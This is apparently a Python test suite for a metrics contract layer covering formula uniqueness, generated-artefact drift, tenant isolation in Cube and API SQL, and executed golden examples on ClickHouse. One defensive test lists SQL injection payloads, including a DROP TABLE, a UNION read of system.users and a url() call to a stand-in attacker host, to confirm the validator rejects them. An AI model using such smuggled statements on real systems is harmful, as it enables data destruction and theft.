"""The governed metric contract, and the three consumers it generates.

The acceptance criterion is *a certified metric returns the same value through
Cube, the API and a dbt test — one definition, three consumers*. Proving that
takes two kinds of test:

**Structural.** The generated artefacts all derive from the same definition, and
the committed copies match what the compiler produces right now. A generated
file that has drifted from its source is worse than no generated file, because
it looks authoritative.

**Executed.** The metric's own `examples` block runs against seeded ClickHouse
data and must produce the declared value. Those examples are the golden tests —
an example that is never executed is a comment that ages badly.
"""

from __future__ import annotations

import os
import urllib.error
import urllib.parse
import urllib.request
import uuid
from collections.abc import Iterator
from pathlib import Path

import pytest

from metrics.compile import api_sql, compile_all, cube_model, cube_tenant_policy, dbt_tests
from metrics.contract import (
    MetricDefinition,
    MetricRegistry,
    QualityTest,
    Unit,
)

ROOT = Path(__file__).resolve().parents[3]
CLICKHOUSE_URL = os.environ.get("FITOS_CLICKHOUSE_URL", "http://127.0.0.1:8123/")
CLICKHOUSE_USER = os.environ.get("FITOS_CLICKHOUSE_USER", "fitos")
CLICKHOUSE_PASSWORD = os.environ.get("FITOS_CLICKHOUSE_PASSWORD", "fitos_local_only")
REQUIRE = bool(os.environ.get("FITOS_REQUIRE_CLICKHOUSE"))


@pytest.fixture(scope="module")
def registry() -> MetricRegistry:
    return MetricRegistry.load()


# ---------------------------------------------------------------------------
# The definitions themselves
# ---------------------------------------------------------------------------


def test_every_definition_loads_and_validates(registry: MetricRegistry) -> None:
    assert len(registry) >= 3


def test_the_registry_is_not_empty_so_the_parametrised_tests_mean_something(
    registry: MetricRegistry,
) -> None:
    """Guards the guard. A suite parametrised over an empty list passes."""
    assert list(registry), "no metric definitions loaded; every test below is vacuous"


def test_a_formula_appears_exactly_once(registry: MetricRegistry) -> None:
    """RELEASE-BLOCKING. "Formulas exist once" is a rule in CLAUDE.md.

    Two metrics with the same expression are either a duplicate that will drift
    or a missing shared definition. Either way it is the thing this layer exists
    to prevent.
    """
    seen: dict[str, str] = {}
    for definition in registry:
        normalised = " ".join(definition.measure_expression.split())
        if normalised in seen:
            pytest.fail(f"{definition.key} and {seen[normalised]} share a formula: {normalised}")
        seen[normalised] = definition.key


def test_only_one_version_of_each_metric_is_live(registry: MetricRegistry) -> None:
    """Two live versions means two answers to "what is this metric"."""
    live: dict[str, int] = {}
    for definition in registry:
        if definition.valid_to is None:
            live[definition.key] = live.get(definition.key, 0) + 1
    assert all(count == 1 for count in live.values()), live


def test_a_superseded_version_stays_resolvable(registry: MetricRegistry) -> None:
    """Evidence references a version and must remain reproducible forever.

    A gap raised under v1 has to keep resolving to v1's formula even after v2
    is live, or its evidence stops meaning anything.
    """
    for definition in registry:
        fetched = registry.get(definition.key, version=definition.version)
        assert fetched.measure_expression == definition.measure_expression


def test_certification_is_computed_not_declared(registry: MetricRegistry) -> None:
    """Certification cannot be granted by editing a flag.

    It follows from having an owner, executable examples and quality tests —
    the things that actually make a metric trustworthy.
    """
    assert not hasattr(MetricDefinition, "is_certified_field")
    for definition in registry:
        expected = bool(definition.owner and definition.quality_tests and definition.examples)
        assert definition.is_certified is expected


def test_an_uncertified_metric_names_what_it_is_missing() -> None:
    """ "Why is my metric not in the product" should not require reading code."""
    definition = MetricDefinition(
        key="draft_metric",
        name="Draft",
        description="A metric that is not ready for anything.",
        owner="someone",
        version=1,
        grain=["organization_id"],
        measure_expression="count()",
        source_models=["gov_transactions"],
        unit=Unit.COUNT,
        valid_from="2026-01-01",  # type: ignore[arg-type]
    )
    assert not definition.is_certified
    assert definition.certification_gaps == ["quality_tests", "examples"]


# ---------------------------------------------------------------------------
# The expression is not an injection surface
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "expression",
    [
        "count(); DROP TABLE fitos.fact_transaction",
        "count() -- and then",
        "count() /* smuggled */",
        "count() UNION ALL SELECT * FROM system.users",
        "count() FROM url('http://attacker.test/x', CSV)",
        "count(); INSERT INTO x VALUES (1)",
    ],
)
def test_a_measure_expression_cannot_smuggle_a_statement(expression: str) -> None:
    """A metric definition is reviewed, but it is also the most attractive place
    in the system to hide a statement — it compiles straight into SQL that runs
    with the query layer's privileges."""
    with pytest.raises(ValueError, match="single SQL expression"):
        MetricDefinition(
            key="hostile",
            name="Hostile",
            description="Attempts to smuggle a statement.",
            owner="nobody",
            version=1,
            grain=["organization_id"],
            measure_expression=expression,
            source_models=["gov_transactions"],
            unit=Unit.COUNT,
            valid_from="2026-01-01",  # type: ignore[arg-type]
        )


def test_a_ratio_must_declare_its_bounds() -> None:
    """A ratio above 1 is almost always a join fan-out.

    It is the single most common way a metric layer produces a confidently
    wrong number, so declaring the bound is mandatory rather than advisory.
    """
    with pytest.raises(ValueError, match="join fan-out"):
        MetricDefinition(
            key="unbounded_ratio",
            name="Unbounded",
            description="A ratio with no declared bound.",
            owner="someone",
            version=1,
            grain=["organization_id"],
            measure_expression="count() / nullIf(count(), 0)",
            source_models=["gov_transactions"],
            unit=Unit.RATIO,
            valid_from="2026-01-01",  # type: ignore[arg-type]
        )


def test_money_must_declare_a_currency_policy() -> None:
    """Summing minor units across currencies is meaningless."""
    with pytest.raises(ValueError, match="currency_policy"):
        MetricDefinition(
            key="naive_money",
            name="Naive money",
            description="Sums minor units with no currency policy.",
            owner="someone",
            version=1,
            grain=["organization_id"],
            measure_expression="sum(amount_minor)",
            source_models=["gov_transactions"],
            unit=Unit.CURRENCY_MINOR,
            valid_from="2026-01-01",  # type: ignore[arg-type]
        )


def test_a_filter_must_be_something_the_metric_can_group_by() -> None:
    """A filter that is not a dimension silently does nothing — or worse,
    changes the denominator without changing the numerator."""
    with pytest.raises(ValueError, match="allowed_filters"):
        MetricDefinition(
            key="bad_filter",
            name="Bad filter",
            description="Allows a filter it has no dimension for.",
            owner="someone",
            version=1,
            grain=["organization_id"],
            measure_expression="count()",
            dimensions=["location_id"],
            allowed_filters=["location_id", "not_a_dimension"],
            source_models=["gov_transactions"],
            unit=Unit.COUNT,
            valid_from="2026-01-01",  # type: ignore[arg-type]
        )


# ---------------------------------------------------------------------------
# One definition, three consumers
# ---------------------------------------------------------------------------


def test_all_three_consumers_carry_the_same_expression(registry: MetricRegistry) -> None:
    """RELEASE GATE, structural half.

    The Cube measure, the API SQL and the dbt test all contain the definition's
    expression verbatim. Three hand-written copies agree right up until somebody
    edits one, and the divergence is silent.
    """
    for definition in registry:
        expression = definition.measure_expression

        assert expression in cube_model(definition), f"{definition.key}: not in the Cube model"
        sql, _ = api_sql(definition)
        assert expression in sql, f"{definition.key}: not in the API SQL"

        for content in dbt_tests(definition).values():
            assert expression in content, f"{definition.key}: not in the dbt test"


def test_the_committed_generated_files_are_current(registry: MetricRegistry) -> None:
    """A generated file that has drifted looks authoritative and is not.

    This is why the artefacts are committed rather than produced at runtime: a
    reviewer needs to see what will execute. Committing them only helps if they
    cannot rot.
    """
    artefacts = compile_all(
        registry,
        cube_dir=ROOT / "services" / "semantic" / "model" / "cubes",
        dbt_test_dir=ROOT / "data" / "dbt" / "tests" / "metrics",
    )
    stale = []
    for path, expected in artefacts.items():
        if not path.exists():
            stale.append(f"{path.relative_to(ROOT)} is missing")
        elif path.read_text() != expected:
            stale.append(f"{path.relative_to(ROOT)} differs from the definition")

    assert not stale, "run `pnpm metrics:compile`:\n" + "\n".join(stale)


def test_every_generated_file_says_it_is_generated(registry: MetricRegistry) -> None:
    """A generated file without the header gets hand-edited within a month."""
    artefacts = compile_all(
        registry,
        cube_dir=ROOT / "services" / "semantic" / "model" / "cubes",
        dbt_test_dir=ROOT / "data" / "dbt" / "tests" / "metrics",
    )
    for path, content in artefacts.items():
        assert "GENERATED FILE" in content.split("\n")[0], path


def test_the_api_sql_binds_the_tenant_rather_than_interpolating_it(
    registry: MetricRegistry,
) -> None:
    """RELEASE GATE. The tenant must never arrive as a string in a query."""
    for definition in registry:
        sql, parameters = api_sql(definition)
        assert "%(organization_id)s" in sql, definition.key
        # A literal UUID would mean somebody baked a tenant into a generated
        # query, which would serve the wrong one everywhere it was reused.
        assert "organization_id = '" not in sql, definition.key
        assert "organization_id" not in parameters, (
            "the tenant is bound by the caller from the verified principal, "
            "never carried in the generated parameter map"
        )


def test_a_superseded_version_gets_no_cube_model() -> None:
    """It stays resolvable as evidence but must not be queryable as current."""
    superseded = MetricDefinition(
        key="old_metric",
        name="Old",
        description="A superseded metric that must not be queryable.",
        owner="someone",
        version=1,
        grain=["organization_id"],
        measure_expression="count()",
        source_models=["gov_transactions"],
        unit=Unit.COUNT,
        valid_from="2026-01-01",  # type: ignore[arg-type]
        valid_to="2026-06-01",  # type: ignore[arg-type]
        quality_tests=[QualityTest.NOT_NULL],
    )
    artefacts = compile_all(
        MetricRegistry([superseded]),
        cube_dir=Path("/cubes"),
        dbt_test_dir=Path("/tests"),
    )
    assert not any("old_metric.yml" in str(p) for p in artefacts)


# ---------------------------------------------------------------------------
# Cube tenancy
# ---------------------------------------------------------------------------


def test_the_cube_policy_takes_the_tenant_from_the_security_context() -> None:
    """RELEASE GATE. Cube's queryRewrite is where its multi-tenancy lives.

    A cube without one serves whichever rows the query asks for, and the query
    is written by the caller.
    """
    policy = cube_tenant_policy()
    assert "securityContext" in policy
    assert "queryRewrite" in policy
    assert "query.filters.push" in policy


def test_the_cube_policy_refuses_rather_than_defaults_when_there_is_no_tenant() -> None:
    """Returning everything would be catastrophic; returning nothing would look
    like an empty dataset and get "fixed" by somebody."""
    policy = cube_tenant_policy()
    assert "throw new Error" in policy
    assert "refusing to query" in policy


def test_the_cube_cache_key_includes_the_tenant() -> None:
    """A cache that ignores the tenant is a cross-tenant read with a
    performance benefit."""
    policy = cube_tenant_policy()
    assert "contextToAppId" in policy
    assert "securityContext" in policy.split("contextToAppId")[1][:200]


def test_the_tenant_column_is_not_selectable_in_any_cube(
    registry: MetricRegistry,
) -> None:
    """The filter is applied for the caller. Being able to group by the tenant
    is how one tenant discovers another exists."""
    for definition in registry:
        model = cube_model(definition)
        assert "public: false" in model, definition.key


# ---------------------------------------------------------------------------
# The examples execute
# ---------------------------------------------------------------------------


def _query(sql: str, database: str = "fitos") -> str:
    params = urllib.parse.urlencode(
        {"user": CLICKHOUSE_USER, "password": CLICKHOUSE_PASSWORD, "database": database}
    )
    request = urllib.request.Request(f"{CLICKHOUSE_URL}?{params}", data=sql.encode())
    with urllib.request.urlopen(request, timeout=60) as response:
        return str(response.read().decode())


def _clickhouse_available() -> bool:
    try:
        _query("SELECT 1", database="default")
    except (urllib.error.URLError, OSError):
        return False
    return True


live = pytest.mark.skipif(
    not _clickhouse_available() and not REQUIRE,
    reason="ClickHouse is unavailable; set FITOS_REQUIRE_CLICKHOUSE=1 to require it",
)

ORG = uuid.uuid4()


@pytest.fixture(scope="module")
def seeded() -> Iterator[None]:
    """Data chosen so the declared examples are the right answers.

    Three stock checks at one location, all discrepant, seven units missing in
    total: `stock_discrepancy_rate` is 1.0 and `stock_units_missing` is 7.
    """
    if not _clickhouse_available():
        pytest.fail("FITOS_REQUIRE_CLICKHOUSE is set but ClickHouse is not reachable")

    from canonical.apply import apply

    apply(url=CLICKHOUSE_URL, user=CLICKHOUSE_USER, password=CLICKHOUSE_PASSWORD, database="fitos")

    connection = uuid.uuid4()
    for index, (system, observed) in enumerate([(10, 8), (20, 17), (5, 3)], start=1):
        _query(
            "INSERT INTO fitos.fact_inventory_snapshot (organization_id, source_key, "
            "source_connection_id, source_record_id, lineage_ref, mapping_version, "
            "occurred_at, ingested_at, received_at, data_quality_flags, location_id, "
            f"product_variant_id, system_quantity) VALUES ('{ORG}', 'pos', '{connection}', "
            f"'SNAP-{index}', 'raw/s', 1, '2026-05-01 08:00:00.000', "
            f"'2026-05-01 12:00:00.000', NULL, [], 'NS-014', 'SKU-{index}', {system})"
        )
        _query(
            "INSERT INTO fitos.fact_stock_check (organization_id, source_key, "
            "source_connection_id, source_record_id, lineage_ref, mapping_version, "
            "occurred_at, ingested_at, received_at, data_quality_flags, check_id, "
            f"location_id, product_variant_id, staff_member_id, observed_quantity) VALUES "
            f"('{ORG}', 'csv_upload', '{connection}', 'CHK-{index}', 'raw/c', 1, "
            f"'2026-05-01 10:00:00.000', '2026-05-01 12:00:00.000', NULL, [], 'CHK-{index}', "
            f"'NS-014', 'SKU-{index}', NULL, {observed})"
        )

    # Two accepted transactions and no rejections, so data_completeness is 1.0.
    # Seeded because an example that cannot execute is an example that silently
    # never runs, which is exactly what these tests exist to prevent.
    for index in (1, 2):
        _query(
            "INSERT INTO fitos.fact_transaction (organization_id, source_key, "
            "source_connection_id, source_record_id, lineage_ref, mapping_version, "
            "occurred_at, ingested_at, received_at, data_quality_flags, transaction_id, "
            "location_id, channel_id, campaign_id, anonymous_subject_id, amount_minor, "
            f"currency, line_count) VALUES ('{ORG}', 'csv_upload', '{connection}', "
            f"'TXN-{index}', 'raw/t', 1, '2026-05-01 10:00:00.000', "
            f"'2026-05-01 12:00:00.000', NULL, [], 'T-{index}', 'NS-014', 'store', NULL, "
            f"NULL, 1000, 'GBP', 1)"
        )

    yield

    _query(f"ALTER TABLE fitos.fact_stock_check DELETE WHERE organization_id = '{ORG}'")
    _query(f"ALTER TABLE fitos.fact_inventory_snapshot DELETE WHERE organization_id = '{ORG}'")
    _query(f"ALTER TABLE fitos.fact_transaction DELETE WHERE organization_id = '{ORG}'")


@live
def test_every_example_executes_and_matches(registry: MetricRegistry, seeded: None) -> None:
    """RELEASE GATE, executed half. The examples are the golden tests.

    Each metric declares what it should produce for a given filter; this runs
    the real generated SQL against real data and checks it. An example that is
    never executed is a comment, and a metric layer full of stale comments is
    worse than one with none.
    """
    checked = 0
    for definition in registry:
        for example in definition.examples:
            sql, parameters = api_sql(definition, filters=example.filters)

            # Bind exactly as the API does. ClickHouse's HTTP interface takes
            # parameters as {name:Type}, so the placeholders are substituted
            # here for the test rather than the values being interpolated into
            # the query the API would run.
            executable = sql.replace("%(organization_id)s", f"'{ORG}'")
            for placeholder, bound in parameters.items():
                executable = executable.replace(f"%({placeholder})s", f"'{bound}'")

            rows = _query(executable, database="fitos_governed").strip()
            if not rows:
                pytest.fail(f"{definition.identity}: the example produced no rows")

            columns = rows.split("\n")[0].split("\t")
            grouping = [g for g in definition.grain if g != "organization_id"]
            measured = float(columns[len(grouping)])

            assert abs(measured - example.expected) <= max(example.tolerance, 1e-9), (
                f"{definition.identity} with {example.filters}: "
                f"expected {example.expected}, got {measured}"
            )
            checked += 1

    assert checked >= 2, "no examples were executed; this test proved nothing"


# ---------------------------------------------------------------------------
# The product catalogue
# ---------------------------------------------------------------------------


def test_metric_catalogue_matches_the_definitions() -> None:
    """The committed catalogue is what the metrics route renders.

    If it drifts from the YAML, the product shows a metric that no longer
    exists, or claims a certification the definition does not support.
    """
    import json
    import sys
    from pathlib import Path

    tools = Path(__file__).resolve().parents[3] / "services" / "api" / "tools"
    sys.path.insert(0, str(tools))
    from export_metric_catalogue import CATALOGUE_PATH, build

    assert CATALOGUE_PATH.exists(), (
        "packages/contracts/src/metric-catalogue.json is missing. Regenerate with "
        "`uv run python services/api/tools/export_metric_catalogue.py`."
    )
    assert json.loads(CATALOGUE_PATH.read_text()) == build(), (
        "The metric catalogue has drifted from data/metrics/definitions. Regenerate with "
        "`uv run python services/api/tools/export_metric_catalogue.py`."
    )


def test_the_catalogue_never_carries_a_formula() -> None:
    """RELEASE GATE for the metrics route.

    `measure_expression` is gated by `metric.view_query_detail`, and a JSON file
    compiled into a client bundle cannot enforce a capability — it ships to
    everyone who loads the page, whatever their role. Exporting it here would
    put every formula in every visitor's browser while the API still carefully
    withholds it.

    Checked against the serialised bytes, not the keys: a formula nested inside
    a description or an example would pass a key check and still be published.
    """
    import json
    import sys
    from pathlib import Path

    sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "services" / "api" / "tools"))
    from export_metric_catalogue import build

    serialised = json.dumps(build())
    registry = MetricRegistry.load()

    assert registry.definitions, "an empty registry would make this assertion vacuous"
    for definition in registry.definitions:
        expression = definition.measure_expression.strip()
        assert expression, f"{definition.key} has no expression; the check would prove nothing"
        assert expression not in serialised, (
            f"{definition.key}'s measure_expression reached the client catalogue"
        )
        # The distinctive fragment too, in case whitespace differs.
        fragment = expression.split("(")[0].strip()
        if len(fragment) > 4:
            assert fragment not in serialised, (
                f"{definition.key}'s formula fragment {fragment!r} reached the client catalogue"
            )


def test_the_catalogue_is_not_trivially_empty() -> None:
    """A drift test and a leak test over an empty catalogue both pass."""
    import sys
    from pathlib import Path

    sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "services" / "api" / "tools"))
    from export_metric_catalogue import build

    catalogue = build()
    assert len(catalogue["metrics"]) >= 3
    assert all(entry["identity"] for entry in catalogue["metrics"])
